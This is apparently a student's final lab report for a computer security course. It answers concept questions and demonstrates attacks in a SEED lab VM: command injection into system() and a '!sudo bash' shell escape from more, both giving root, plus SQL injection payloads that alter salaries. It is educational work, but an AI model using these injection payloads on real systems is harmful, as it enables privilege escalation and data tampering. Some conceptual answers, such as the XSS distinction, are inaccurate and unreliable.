## Final Lab
###### Lin Shi (n92s773)
###### linshi1768@gmail.com
###### CSCI 476
###### April 27, 2021
<br>

### Task 1:

##### Task 1.1:

**Question:** Both system() and execve() can be used to execute external programs. Why is system() considered to be unsafe while execve() is considered to be safe?

**Answer:** System() and execve() both takes in some parameter and execute it. However, execve() is safer because it separates the data and command, which means the information send to execve as data will not be interpreted as data and not as a command. On the other hand, system() will take what ever is passed in and run it, which means if you pass in some command as data, it will also execute it. Therefore, system() is unsafe compare to execve().

##### Task 1.2:

**Question:** For the Shellshock vulnerability to be exploitable, two conditions need to be satisfied. What are these two conditions?

**Answer:** In order for the Shellshock vulnerability to be exploitable, the two conditions that we must meet are the server must be using bash and teh attacker has to be able to send environment variables to the server.

##### Task 1.3:

**Question:** Suppose we run $nc -l 7070 on Machine 1 and we type $ /bin/cat < /dev/tcp/10.0.2.6/7070 >&0 in Machine 2. What happens?

**Answer:** First, on Machine 1, the nc -l 7070 tells machine 1 to be listening on port 7070 for some connection. Then Machine 2 will make a connection with Machine 1 on port 7070. However, the command < /dev/tcp/10.0.2.6/7070 tells machine 2 to listen for input from Machine 1. Then, the output is redirected to port 7070 on Machine 1 by the command >&0. Overall, Machine 1 starts up and listens on port 7070. Machine 2 connects and listens to Machine 1 for input. Once Machine 1 have some input, Machine 2 will redirected it back to Machine 1 as output. Thus, the line will bee printed twice on Machine 1.

##### Task 1.4:

**Question:** What is ASLR and why does ASLR make buffer-overflow attacks more difficult?

**Answer:** ASLR is Address Space Layout Randomization, which randomized stack frame's location in memory every time we run the program. As we know, buffer-overflow attack looks for those return addresses and its location, by randomizing where it could be in the memory will cause an hassle to the attacker. More often than not, they will run into the segmentation fault since the address was not located in the spot they anticipated.

##### Task 1.5:

**Question:** What is the underlying cause for XSS vulnerabilities?

**Answer:** The fundamental cause of XSS vulnerabilities is in the separation between code and data. The vulnerability means that we have treated some data, in some code form, has been treated as part of the program. Which means it will execute the data as program, causing some unwanted results.


##### Task 1.6:

**Question:** What is the difference between reflected XSS and stored XSS?

**Answer:** The reflected XSS means the code will react in some way after been executed, such as alert() calls in Javascript when we did the lab. The stored XSS will store the information for later use, such as storing the cookie information.

##### Task 1.7:

**Question:** In the Diffie-Hellman key exchange, Alice sends $$ g^x \bmod p $$ to Bob, and Bob sends $$ g^y \bmod p $$ to Alice. How do they get a common secret?

**Answer:** In this case, Alice will have the information Bob send her and x. Bob will have what Alice send him and y. Alice could take the information, raise it to the power of x and like $$ g^y^x \bmod p $$ and Bob could do $$ g^x^y \bmod p $$. Through the power rule, we know $$ g^x^y $$ == $$ g^y^x $$ == $$ g^xy $$. Therefore, without knowing the other person's secret information, x or y, Bob and Alice could get the common secret.

##### Task 1.8:

**Question:** Why do we use hybrid encryption? Why don’t we simply use public key cryptography to encrypt everything?

**Answer:** Even though public key cryptography is safer, it is also slower. There is a tradeoff between security and speed. Therefore, to speed up the communication while maintaining some security where it is necessary, we will use the hybrid encryption.

##### Task 1.9:

###### Part 1:

**Question:** When you run programs at the command line (e.g., ls, cat, top) or link to libraries (e.g., libc), how are these programs/libraries found?

**Answer:** The libraries are founding using the $PATH environment variables that will tell them where these libraries are located.

###### Part 2:

**Question:** What is a potential risk of using this approach to find programs/libraries?

**Answer:** If the attacker changes the $PATH environment to point to some other directory of his choosing, we might be running the code the attacker want us to run.

##### Task 1.10:

**Question:** Identify at least three countermeasures to buffer-overflow attacks and briefly describe how they work.

**Answer:** First, there is the ASLR that we talked about above. ASLR will randomized the return address in memory location. It will cause segmentation fault in most cases; however, if the stack's possibility is not that high like the one we did in the lab. It is totally possible for us to brute force to defeat ASLR. Second, there is the StackGuard Protection option. The StackGuard will have some kind of key at the beginning and the end to ensure nothing on the stack frame has been changed. It is initialized randomly with each call and should remain unchanged. Lastly, there is the non-executable stack protection. It basically makes the stack non-executable; therefore, the input cannot be interpreted as code.

### Task 2:

##### Task 2.1:
In this scenario, the customer only had two requests: securely store sensitive project data, DATA, and minimize data lose. Since all the tools that we learned will secure the data in some way and minimize data lose is something important to the customer, we should focus on that. In the end, I decided that CTR would be the best for this scenario, 1 byte corrupted will mean 1 byte lost, 1 byte lost will be N bytes lost. On the other hand, if we store the key and type of encryption in the DATA, it would be extremely unsafe. I would store the information in some other field, not named password and hide it from the user if possible, and encrypted it with GCM to ensure security. Therefore, as long as the "secret file" has not been modified or touched, the original data would be easily decodable. Additionally, even if the DATA section has been messed around, since we used CTR, there will be low lost in terms of bytes. On the other hand, the option CTR option would not be as secure; therefore, in this software, I would offer GCM option if the customer chooses so. This way, the customer could choose if they wish for more confidentially over data recovery. Overall, this encryption method to ensure it fits what the customer asked for, minimize data loss. Since we hid the secret key file from the user, probably as a random text in a hidden file, the user is unlikely to modify the key, making it more secure. However, if the key has been modified, our file would not be openable since it is GCM, but I believe that is necessary since we would want to make sure the key is safe. Additionally, the confidentially of CTR is not that high; therefore, we would offer GCM if the customer believe that is necessary for the data they wish to encrypt.

##### Task 2.2:
Compliance will ensure that the rules/policies are being followed and companies are meeting the requirement. These rules are often set by industry, government, and or other third parties. The compliance are curial to ensure that everyone within the industry and being safe enough to not cause any issues while all working on their products. It is also important for the consumer to understand how the companies are following the industry standards. Additionally, the compliance framework is a structures set of guidelines and best practices that details a company's processes for meeting regulatory requirements. For example, STIG-217976 states that the Ubuntu operating sytem must implement ASLR to protect is memory from unauthorized code execution. We could test this through the command sudo sysctl kernel.randomize_va_space. With this rule in place, we would know that all Ubuntu will have ASLR implemented, which is very important to defend against buffer-overflow attacks. Then we have STIG-72005, which states the Red Hat Enterprise Linux oeprating system must be configured so that the root account must be the only account having unrestricted access to the sytem. It could be checked with awk -F: '$3 == 0 {print $1}' /etc/passwd. Again, we could ensure that root will be the only account with unrestricted access in Red Hat Enterprise Linux operating system. That would not be something we need to worry about while using Red Hat Enterprise operating system. Lastly, we have the STIG-71983, which states that the Red Hat Enterprise Linux operating system must be configured to disable USB mass storage. Which could be checked with grep usb-storage /etc/modprobe.d/* | grep -i "blacklist" | grep -v "^#". This could help us ensure that all USB mass storage are disabled. These policies could ensure that while using the operating system, they all follow the same rule, so we could protect against some of these known attacks. 

### Task 3:

##### Task 3.1:
In this task, we are discussing how audit.c is going to work:
```
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
  char *v[3];
  char *command;

  if(argc < 2) {
    printf("Please type a file name.\n");
    return 1;
  }

  v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;
  command = malloc(strlen(v[0]) +strlen(v[1]) + 2);
  sprintf(command, "%s %s", v[0], v[1]);
  system(command);

  return 0 ;
}
```
In the audit.c program, it will first look at the number of command line arguments to make sure we have passed in some file name. Then we are going to create the variable command with /bin/cat and the file name that we wish to open. Lastly, we will run the system() call for the command we have. If we include the file name followed by ; and some command like sudo bash. With system() call running. It is very likely for us to run the sudo bash.


##### Task 3.2:
In this task, we are testing the idea that I mentioned above to exploit the idea:
```
[04/27/21]seed@VM:~/.../final$ nano audit.c
[04/27/21]seed@VM:~/.../final$ gcc -o audit1 audit.c
[04/27/21]seed@VM:~/.../final$ touch temp.txt
[04/27/21]seed@VM:~/.../final$ ./audit1 "temp.txt; sudo bash"
root@VM:/home/seed/Desktop/final# id
uid=0(root) gid=0(root) groups=0(root)
root@VM:/home/seed/Desktop/final# whoami
root
```
As we can see, I compiled the program. Then I ran the program as ./audit1 "temp.txt; sudo bash". The program expected the file name as the input from ""; however, I also gave it ; sudo bash. With system() running, it will run the command just fine. Thus, running the sudo bash command which we should have no access to.

##### Task 3.3:
In this task, we are trying to run the audit2 program which uses execve() and /bin/more. As we previously talked about, execve() is safer than system() since it splits the command and data, which means the strategy we used for system() is not going to work. However, /bin/more gave us another opportunity, from the man page of more, we can see that more will display the pages one at a time, giving a section to enter the commands:
```
!command or :!command
                        Execute command in a subshell.
```
Thus, the attack would still be successful; however, we need to come up with another approach:
```
[04/27/21]seed@VM:~/.../final$ nano audit2.c
[04/27/21]seed@VM:~/.../final$ gcc -o audit2 audit2.c
[04/27/21]seed@VM:~/.../final$ ./audit2 "temp.txt"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
  char *v[3];
  char *command;

  if(argc < 2) {
    printf("Please type a file name.\n");
    return 1;
  }

  v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;
  command = malloc(strlen(v[0]) +strlen(v[1]) + 2);
  sprintf(command, "%s %s", v[0], v[1]);
  system(command);

  return 0 ;
}#include <string.h>
#include <stdio.h>
!sudo bash   
root@VM:/home/seed/Desktop/final# whoami
root
root@VM:/home/seed/Desktop/final# id
uid=0(root) gid=0(root) groups=0(root)
root@VM:/home/seed/Desktop/final# exit
exit
------------------------
```
Before compiling the code, I edited the temp.txt file with a copies of the audit2.c file. Then I compiled audit2.c code. Next, I simply ran audit2 with the file name as temp.txt. As we can see, towards the bottom, I could enter my command as !sudo bash. Then I had the bash with sudo privilege. Therefore, the issue was not necessary in execve(), but in the textreader more. If we decide to use /bin/cat, the issue would not be present.

### Task 4:

##### Task 4.1:
Assuming the filtering logic does its job by removing all special character and keywords, it still does not address the issue of separation between code and data. There could also be some trick that the logic does not protect against. For example, ININSERTSERT, does the logic runs a recursion that will clean out INSERT in both instances? There are plenty of examples like such. It would be great if the logic works and does a great job from every day instances; however, as long as we do not address the issue of separation between the code and data, it will fail to protect and clean the necessary code at some point since in these cases, you can only protect from the strategies you know.

##### Task 4.2:
In this example, the SQL statement require two input from the user, $name and $passwd:
```
$sql = "INSERT INTO employee (Name, EID, Password, Salary)
        VALUES ('$name', 'EID6000', '$passwd', 80000)";
```
As we can see, the user have no access to the Salary section; however, we can also see that Salary is right after the Password section. Therefore, we could try and fake the last bits of the statement by doing **thePasswordYouHave', 80001)";#**. As we can see, the program will take the password. Then it will interpret the 80001 as the salary. Since we commented everything out with #, the original salary number of 80000 will not even be noticed. To demonstrate, I used the docker from lab 4:
```
mysql> create table Employees (Name varchar(255), EID varchar(255), Password varchar(255), Salary int);
```
```
mysql> insert into Employees(Name, EID, Password, Salary) values ("person1", "1", "hispass", 2);
Query OK, 1 row affected (0.02 sec)

mysql> select * from Employees;
+---------+------+----------+--------+
| Name    | EID  | Password | Salary |
+---------+------+----------+--------+
| person1 | 1    | hispass  |      2 |
+---------+------+----------+--------+
1 row in set (0.00 sec)

mysql> insert into Employees(Name, EID, Password, Salary) values ("Lin", "EID6000", 'mypass', 80001); #', 80000);
Query OK, 1 row affected (0.01 sec)

mysql> select * from Employees;
+---------+---------+----------+--------+
| Name    | EID     | Password | Salary |
+---------+---------+----------+--------+
| person1 | 1       | hispass  |      2 |
| Lin     | EID6000 | mypass   |  80001 |
+---------+---------+----------+--------+
2 rows in set (0.00 sec)
```
First, I created a table called Employees with all the such content. Then, just to verify my table works, I have added person1 with some random information. Next, we are going to do our SQL injection attack. First, I copied the sql statement from lab into the line without any modification. Then I replaced my name with $name and started my attack. First, I entered my password as mypass, followed by ' to close it off. Next I added the comma and the desired 80001 salary and close it off with ;. Lastly, I commented everything else with #. As we can see, I have included a person called Lin, with the Salary of 80001, not the default 80000. Therefore, we can concluded that the attack works.

##### Task 4.3:
This time, the attacker (probably my boss, since he's mad that I changed my default salary) wants to run an arbitrary SQL statement to change my salary to 0.
```
mysql> select * from Employees where EID='0'; update Employees set salary=0 where Name='Lin';# 'and password='$passwd';
Empty set (0.00 sec)

Query OK, 2 rows affected (0.00 sec)
Rows matched: 2  Changed: 2  Warnings: 0

mysql> select * from Employees;
+---------+---------+----------+--------+
| Name    | EID     | Password | Salary |
+---------+---------+----------+--------+
| person1 | 1       | hispass  |      2 |
| Lin     | EID6000 | mypass   |      0 |
+---------+---------+----------+--------+
2 rows in set (0.00 sec)
```
First, I copied the SQL statement from writeup. Then I added 0 in EID, closed it off with ';, which mean that we have ended the first statement. Then we added the update statement that update the salary to 0 where name is Lin. Lastly, we will comment everything else with #. As we can see, in our database, Lin's salary has been modified to 0, where it was 80001 previously. Thus, we can concluded that our attack was successful and we ran some arbitrary SQL statement as one statement.
